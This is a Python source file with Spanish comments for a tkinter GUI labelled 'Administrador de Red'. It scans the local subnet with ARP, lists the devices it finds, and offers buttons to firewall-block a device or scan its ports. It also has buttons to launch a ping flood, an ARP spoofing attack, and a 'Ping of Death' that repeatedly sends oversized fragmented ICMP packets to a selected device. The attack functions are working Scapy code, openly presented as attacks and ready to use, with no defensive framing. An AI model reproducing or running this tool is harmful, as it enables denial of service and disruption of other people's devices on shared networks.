import tkinter as tk
from tkinter import messagebox
from scapy.all import *
import netifaces as ni
import subprocess
import threading
import socket

# Función para obtener la dirección IP de la interfaz de red
def get_ip_address():
    interfaces = ni.interfaces()
    for interface in interfaces:
        addresses = ni.ifaddresses(interface)
        if ni.AF_INET in addresses:
            return addresses[ni.AF_INET][0]['addr']
    return None

# Función para escanear la red y detectar dispositivos
def scan_network():
    ip = get_ip_address()
    if ip is None:
        messagebox.showerror("Error", "No se pudo obtener la dirección IP.")
        return []

    try:
        # Suponemos una máscara de subred /24
        ip_range = ip.rsplit('.', 1)[0] + '.1/24'
        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        result = srp(packet, timeout=2, verbose=False)[0]

        devices = []
        for sent, received in result:
            devices.append({'ip': received.psrc, 'mac': received.hwsrc})

        return devices

    except Exception as e:
        messagebox.showerror("Error", f"Ocurrió un error al escanear la red: {e}")
        return []

# Función para bloquear un dispositivo y afectar su conectividad
def block_device(ip):
    try:
        # Agregar una regla de firewall para bloquear el IP
        command = f'netsh advfirewall firewall add rule name="Bloqueo {ip}" dir=in action=block remoteip={ip}'
        subprocess.run(command, shell=True, check=True)
        
        # También vamos a limitar el ancho de banda del dispositivo para que la conexión sea lenta
        command_limit = f'netsh interface ipv4 set subinterface "Ethernet" mtu=1000 store=persistent'
        subprocess.run(command_limit, shell=True, check=True)
        
        messagebox.showinfo("Éxito", f"Dispositivo con IP {ip} bloqueado. La red podría estar lenta.")
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Error", f"No se pudo bloquear el dispositivo con IP {ip}. Error: {e}")

# Función para desbloquear un dispositivo y restablecer la conectividad
def unblock_device(ip):
    try:
        # Eliminar la regla de firewall para desbloquear el IP
        command = f'netsh advfirewall firewall delete rule name="Bloqueo {ip}"'
        subprocess.run(command, shell=True, check=True)
        
        # Restablecer el MTU a su valor por defecto
        command_reset = f'netsh interface ipv4 set subinterface "Ethernet" mtu=1500 store=persistent'
        subprocess.run(command_reset, shell=True, check=True)
        
        messagebox.showinfo("Éxito", f"Dispositivo con IP {ip} desbloqueado. La red debería estar normalizada.")
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Error", f"No se pudo desbloquear el dispositivo con IP {ip}. Error: {e}")

# Función para escanear puertos de un dispositivo
def scan_ports(ip):
    try:
        open_ports = []
        for port in range(1, 1001):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()

        if open_ports:
            messagebox.showinfo("Puertos Abiertos", f"Los siguientes puertos están abiertos en {ip}: {', '.join(map(str, open_ports))}")
        else:
            messagebox.showinfo("Puertos Abiertos", f"No se encontraron puertos abiertos en {ip}.")
    except Exception as e:
        messagebox.showerror("Error", f"Ocurrió un error al escanear puertos en {ip}: {e}")

# Función para realizar un ataque de Ping Flood a un dispositivo
def ping_flood(ip):
    try:
        messagebox.showwarning("Ataque Ping Flood", f"¡Atención! Esta acción causará una saturación de la red en {ip}.")

        # Realizar una solicitud ARP para obtener la dirección MAC del destino
        arp_request = ARP(pdst=ip)
        arp_response = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/arp_request, timeout=2, verbose=False)

        if arp_response:
            conf.verb = 0  # Desactivar los mensajes verbosos de Scapy
            for _ in range(100):  # Enviar 100 paquetes ICMP
                send(IP(dst=ip)/ICMP(), verbose=False)
            conf.verb = 1  # Restaurar los mensajes verbosos de Scapy
            messagebox.showinfo("Ping Flood", f"¡Ataque Ping Flood completado!")
        else:
            messagebox.showerror("Error", f"No se pudo obtener la dirección MAC de {ip}.")
    except Exception as e:
        messagebox.showerror("Error", f"Ocurrió un error durante el ataque Ping Flood: {e}")

# Función para realizar un ataque de ARP Spoofing
def arp_spoof(ip):
    try:
        messagebox.showwarning("ARP Spoofing", f"¡Atención! Se realizará un ataque ARP Spoofing en {ip}.")
        response = srp1(ARP(op=ARP.who_has, pdst=ip), timeout=2, verbose=False)
        if response:
            victim_mac = response.hwsrc
            packet = ARP(op=ARP.is_at, psrc=ip, hwdst=victim_mac)
            send(packet, verbose=False)
            messagebox.showinfo("ARP Spoofing", f"¡Ataque ARP Spoofing completado! {ip} puede experimentar problemas de conectividad.")
        else:
            messagebox.showerror("Error", f"No se pudo obtener la dirección MAC de {ip}.")
    except Exception as e:
        messagebox.showerror("Error", f"Ocurrió un error durante el ataque ARP Spoofing: {e}")

# Función para realizar un ataque de Ping of Death
def ping_of_death(ip):
    try:
        messagebox.showwarning("Ping of Death", f"¡Atención! Se enviará un paquete ICMP grande a {ip}.")
        MESSAGE="T"
        NUMBER_PACKETS=1000 # Number of pings
        Multi=10
        TOTAL= NUMBER_PACKETS*Multi
        packet = IP(dst=ip, flags="MF")/ICMP()/(MESSAGE*60000)
        send(TOTAL*packet)
        messagebox.showinfo("Ping of Death", f"¡Ataque Ping of Death completado! {ip} puede experimentar problemas graves de conectividad.")
    except Exception as e:
        messagebox.showerror("Error", f"Ocurrió un error durante el ataque Ping of Death: {e}")

# Configuración de la interfaz gráfica
def create_gui():
    window = tk.Tk()
    window.title("Administrador de Red")

    frame = tk.Frame(window)
    frame.pack(pady=20)

    label = tk.Label(frame, text="Dispositivos conectados:")
    label.pack()

    listbox = tk.Listbox(frame, width=50)
    listbox.pack()

    def refresh_devices():
        listbox.delete(0, tk.END)
        devices = scan_network()
        if devices:
            for device in devices:
                listbox.insert(tk.END, f"IP: {device['ip']}, MAC: {device['mac']}")
        else:
            messagebox.showinfo("Información", "No se encontraron dispositivos.")

    def block_selected_device():
        selected = listbox.curselection()
        if not selected:
            messagebox.showerror("Error", "No se ha seleccionado ningún dispositivo.")
            return

        device_info = listbox.get(selected[0])
        ip = device_info.split(',')[0].split(': ')[1]
        threading.Thread(target=block_device, args=(ip,)).start()

    def unblock_selected_device():
        selected = listbox.curselection()
        if not selected:
            messagebox.showerror("Error", "No se ha seleccionado ningún dispositivo.")
            return

        device_info = listbox.get(selected[0])
        ip = device_info.split(',')[0].split(': ')[1]
        threading.Thread(target=unblock_device, args=(ip,)).start()

    def scan_ports_selected_device():
        selected = listbox.curselection()
        if not selected:
            messagebox.showerror("Error", "No se ha seleccionado ningún dispositivo.")
            return

        device_info = listbox.get(selected[0])
        ip = device_info.split(',')[0].split(': ')[1]
        threading.Thread(target=scan_ports, args=(ip,)).start()

    def ping_flood_selected_device():
        selected = listbox.curselection()
        if not selected:
            messagebox.showerror("Error", "No se ha seleccionado ningún dispositivo.")
            return

        device_info = listbox.get(selected[0])
        ip = device_info.split(',')[0].split(': ')[1]
        threading.Thread(target=ping_flood, args=(ip,)).start()

    def arp_spoof_selected_device():
        selected = listbox.curselection()
        if not selected:
            messagebox.showerror("Error", "No se ha seleccionado ningún dispositivo.")
            return

        device_info = listbox.get(selected[0])
        ip = device_info.split(',')[0].split(': ')[1]
        threading.Thread(target=arp_spoof, args=(ip,)).start()

    def ping_of_death_selected_device():
        selected = listbox.curselection()
        if not selected:
            messagebox.showerror("Error", "No se ha seleccionado ningún dispositivo.")
            return

        device_info = listbox.get(selected[0])
        ip = device_info.split(',')[0].split(': ')[1]
        threading.Thread(target=ping_of_death, args=(ip,)).start()

    refresh_button = tk.Button(frame, text="Actualizar Dispositivos", command=refresh_devices)
    refresh_button.pack(pady=10)

    block_button = tk.Button(frame, text="Bloquear Dispositivo", command=block_selected_device)
    block_button.pack(pady=5)

    unblock_button = tk.Button(frame, text="Desbloquear Dispositivo", command=unblock_selected_device)
    unblock_button.pack(pady=5)

    scan_ports_button = tk.Button(frame, text="Escanear Puertos", command=scan_ports_selected_device)
    scan_ports_button.pack(pady=5)

    ping_flood_button = tk.Button(frame, text="Ping Flood", command=ping_flood_selected_device)
    ping_flood_button.pack(pady=5)

    arp_spoof_button = tk.Button(frame, text="ARP Spoofing", command=arp_spoof_selected_device)
    arp_spoof_button.pack(pady=5)

    ping_of_death_button = tk.Button(frame, text="Ping of Death", command=ping_of_death_selected_device)
    ping_of_death_button.pack(pady=5)

    window.mainloop()

if __name__ == "__main__":
    create_gui()

